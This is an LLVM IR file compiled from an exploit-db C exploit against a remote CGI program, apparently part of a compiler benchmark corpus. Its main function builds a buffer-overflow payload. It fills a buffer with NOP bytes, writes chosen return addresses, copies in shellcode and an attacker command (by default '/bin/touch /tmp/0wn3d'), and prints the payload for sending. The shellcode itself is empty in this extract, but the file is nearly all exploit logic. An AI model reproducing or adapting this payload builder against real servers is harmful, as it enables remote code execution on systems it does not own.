; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/cgi/remote/extr_20007.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/cgi/remote/extr_20007.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BUF_SIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [22 x i8] c"/bin/touch /tmp/0wn3d\00", align 1
@.str.1 = private unnamed_addr constant [5 x i8] c"s:c:\00", align 1
@EOF = common dso_local global i8 0, align 1
@optarg = common dso_local global i8* null, align 8
@stderr = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [49 x i8] c"WARNING: your command line might get truncated!\0A\00", align 1
@.str.3 = private unnamed_addr constant [65 x i8] c"usage %s [-c command] [-s retaddr] [-o offset] [-a shelloffset]\0A\00", align 1
@shellcode = common dso_local global i8* null, align 8
@TALKING = common dso_local global i8* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i64, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i8, align 1
  %10 = alloca i64, align 8
  %11 = alloca i64, align 8
  %12 = alloca i64, align 8
  %13 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %14 = load i32, i32* @BUF_SIZE, align 4
  %15 = add nsw i32 %14, 1
  %16 = zext i32 %15 to i64
  %17 = call i8* @llvm.stacksave()
  store i8* %17, i8** %5, align 8
  %18 = alloca i8, i64 %16, align 16
  store i64 %16, i64* %6, align 8
  store i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str, i64 0, i64 0), i8** %8, align 8
  store i64 3221218712, i64* %10, align 8
  store i64 3221218936, i64* %11, align 8
  store i64 16, i64* %12, align 8
  store i64 24, i64* %13, align 8
  br label %19

19:                                               ; preds = %55, %2
  %20 = load i32, i32* %3, align 4
  %21 = load i8**, i8*** %4, align 8
  %22 = call signext i8 @getopt(i32 %20, i8** %21, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0))
  store i8 %22, i8* %9, align 1
  %23 = sext i8 %22 to i32
  %24 = load i8, i8* @EOF, align 1
  %25 = sext i8 %24 to i32
  %26 = icmp ne i32 %23, %25
  br i1 %26, label %27, label %56

27:                                               ; preds = %19
  %28 = load i8, i8* %9, align 1
  %29 = sext i8 %28 to i32
  switch i32 %29, label %48 [
    i32 115, label %30
    i32 97, label %33
    i32 111, label %36
    i32 99, label %39
  ]

30:                                               ; preds = %27
  %31 = load i8*, i8** @optarg, align 8
  %32 = call i64 @strtoul(i8* %31, i32* null, i32 0)
  store i64 %32, i64* %10, align 8
  br label %55

33:                                               ; preds = %27
  %34 = load i8*, i8** @optarg, align 8
  %35 = call i64 @strtoul(i8* %34, i32* null, i32 0)
  store i64 %35, i64* %13, align 8
  br label %55

36:                                               ; preds = %27
  %37 = load i8*, i8** @optarg, align 8
  %38 = call i64 @strtoul(i8* %37, i32* null, i32 0)
  store i64 %38, i64* %12, align 8
  br label %55

39:                                               ; preds = %27
  %40 = load i8*, i8** @optarg, align 8
  store i8* %40, i8** %8, align 8
  %41 = load i8*, i8** %8, align 8
  %42 = call i64 @strlen(i8* %41)
  %43 = icmp ugt i64 %42, 42
  br i1 %43, label %44, label %47

44:                                               ; preds = %39
  %45 = load i32, i32* @stderr, align 4
  %46 = call i32 (i32, i8*, ...) @fprintf(i32 %45, i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.2, i64 0, i64 0))
  br label %47

47:                                               ; preds = %44, %39
  br label %55

48:                                               ; preds = %27
  %49 = load i32, i32* @stderr, align 4
  %50 = load i8**, i8*** %4, align 8
  %51 = getelementptr inbounds i8*, i8** %50, i64 0
  %52 = load i8*, i8** %51, align 8
  %53 = call i32 (i32, i8*, ...) @fprintf(i32 %49, i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.3, i64 0, i64 0), i8* %52)
  %54 = call i32 @exit(i32 1) #4
  unreachable

55:                                               ; preds = %47, %36, %33, %30
  br label %19

56:                                               ; preds = %19
  %57 = load i64, i64* %12, align 8
  %58 = getelementptr inbounds i8, i8* %18, i64 %57
  store i8* %58, i8** %7, align 8
  %59 = load i32, i32* @BUF_SIZE, align 4
  %60 = add nsw i32 %59, 1
  %61 = call i32 @bzero(i8* %18, i32 %60)
  %62 = load i32, i32* @BUF_SIZE, align 4
  %63 = call i32 @memset(i8* %18, i32 144, i32 %62)
  %64 = load i64, i64* %11, align 8
  %65 = lshr i64 %64, 0
  %66 = and i64 %65, 255
  %67 = trunc i64 %66 to i8
  %68 = load i8*, i8** %7, align 8
  %69 = getelementptr inbounds i8, i8* %68, i32 1
  store i8* %69, i8** %7, align 8
  store i8 %67, i8* %68, align 1
  %70 = load i64, i64* %11, align 8
  %71 = lshr i64 %70, 8
  %72 = and i64 %71, 255
  %73 = trunc i64 %72 to i8
  %74 = load i8*, i8** %7, align 8
  %75 = getelementptr inbounds i8, i8* %74, i32 1
  store i8* %75, i8** %7, align 8
  store i8 %73, i8* %74, align 1
  %76 = load i64, i64* %11, align 8
  %77 = lshr i64 %76, 16
  %78 = and i64 %77, 255
  %79 = trunc i64 %78 to i8
  %80 = load i8*, i8** %7, align 8
  %81 = getelementptr inbounds i8, i8* %80, i32 1
  store i8* %81, i8** %7, align 8
  store i8 %79, i8* %80, align 1
  %82 = load i64, i64* %11, align 8
  %83 = lshr i64 %82, 24
  %84 = and i64 %83, 255
  %85 = trunc i64 %84 to i8
  %86 = load i8*, i8** %7, align 8
  %87 = getelementptr inbounds i8, i8* %86, i32 1
  store i8* %87, i8** %7, align 8
  store i8 %85, i8* %86, align 1
  %88 = load i64, i64* %10, align 8
  %89 = lshr i64 %88, 0
  %90 = and i64 %89, 255
  %91 = trunc i64 %90 to i8
  %92 = load i8*, i8** %7, align 8
  %93 = getelementptr inbounds i8, i8* %92, i32 1
  store i8* %93, i8** %7, align 8
  store i8 %91, i8* %92, align 1
  %94 = load i64, i64* %10, align 8
  %95 = lshr i64 %94, 8
  %96 = and i64 %95, 255
  %97 = trunc i64 %96 to i8
  %98 = load i8*, i8** %7, align 8
  %99 = getelementptr inbounds i8, i8* %98, i32 1
  store i8* %99, i8** %7, align 8
  store i8 %97, i8* %98, align 1
  %100 = load i64, i64* %10, align 8
  %101 = lshr i64 %100, 16
  %102 = and i64 %101, 255
  %103 = trunc i64 %102 to i8
  %104 = load i8*, i8** %7, align 8
  %105 = getelementptr inbounds i8, i8* %104, i32 1
  store i8* %105, i8** %7, align 8
  store i8 %103, i8* %104, align 1
  %106 = load i64, i64* %10, align 8
  %107 = lshr i64 %106, 24
  %108 = and i64 %107, 255
  %109 = trunc i64 %108 to i8
  %110 = load i8*, i8** %7, align 8
  %111 = getelementptr inbounds i8, i8* %110, i32 1
  store i8* %111, i8** %7, align 8
  store i8 %109, i8* %110, align 1
  %112 = load i8*, i8** @shellcode, align 8
  %113 = load i64, i64* %13, align 8
  %114 = getelementptr inbounds i8, i8* %18, i64 %113
  %115 = load i8*, i8** @shellcode, align 8
  %116 = getelementptr inbounds i8, i8* %115, i64 1
  %117 = call i64 @strlen(i8* %116)
  %118 = call i32 @bcopy(i8* %112, i8* %114, i64 %117)
  %119 = load i8*, i8** %8, align 8
  %120 = load i8*, i8** @shellcode, align 8
  %121 = call i64 @strlen(i8* %120)
  %122 = add i64 24, %121
  %123 = getelementptr inbounds i8, i8* %18, i64 %122
  %124 = load i8*, i8** %8, align 8
  %125 = call i64 @strlen(i8* %124)
  %126 = add i64 %125, 1
  %127 = call i32 @bcopy(i8* %119, i8* %123, i64 %126)
  %128 = load i8*, i8** @TALKING, align 8
  %129 = call i32 @printf(i8* %128, i8* %18)
  %130 = load i8*, i8** %5, align 8
  call void @llvm.stackrestore(i8* %130)
  ret void
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local signext i8 @getopt(i32, i8**, i8*) #2

declare dso_local i64 @strtoul(i8*, i32*, i32) #2

declare dso_local i64 @strlen(i8*) #2

declare dso_local i32 @fprintf(i32, i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @bzero(i8*, i32) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @bcopy(i8*, i8*, i64) #2

declare dso_local i32 @printf(i8*, i8*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
